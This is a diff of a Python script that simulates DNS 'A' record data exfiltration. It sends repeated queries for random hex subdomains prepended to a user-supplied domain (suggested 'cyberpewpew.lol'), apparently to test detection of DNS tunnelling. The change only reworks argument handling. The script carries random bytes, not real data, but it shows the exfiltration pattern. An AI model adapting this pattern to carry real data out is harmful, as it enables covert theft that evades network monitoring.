@@ -1,20 +1,19 @@
 #!/usr/bin/env python
+
+# Script to replicate Threat Injection: DNS 'A' record data exfiltration
 import sys
 import dns.resolver
 import os,binascii
 from time import sleep
 
-# Accept a number of requests to make if given, else, 100
-if len(sys.argv) > 1:
+# Check arguments are given
+if not len(sys.argv) == 3:
+    print "Usage:\t%s <#_of_requests> <domain>" %sys.argv[0]
+    print "\tI suggest '100' and 'cyberpewpew.lol'"
+    exit()
+else:
     num = sys.argv[1]
-else:
-    num = 100
-
-# Accept a domain name, else, cyberpewpew.lol
-if len(sys.argv) > 2:
     domain = sys.argv[2]
-else:
-    domain = 'cyberpewpew.lol'
 
 # Create new dns resolveer instance
 resolver = dns.resolver.Resolver()
@@ -28,7 +27,7 @@ for d in range(0, int(num)):
     # Create two 16 byte hex subdomains
     sd1 = binascii.b2a_hex(os.urandom(16)) + '.'
     sd2 = binascii.b2a_hex(os.urandom(16)) + '.'
-    # Prepend them to 'cyberpewpew.lol'
+    # Prepend subdomains 1 & 2 to the domain
     rdomain = sd1 + sd2 + domain
     # Make DNS 'A' record request
     try:
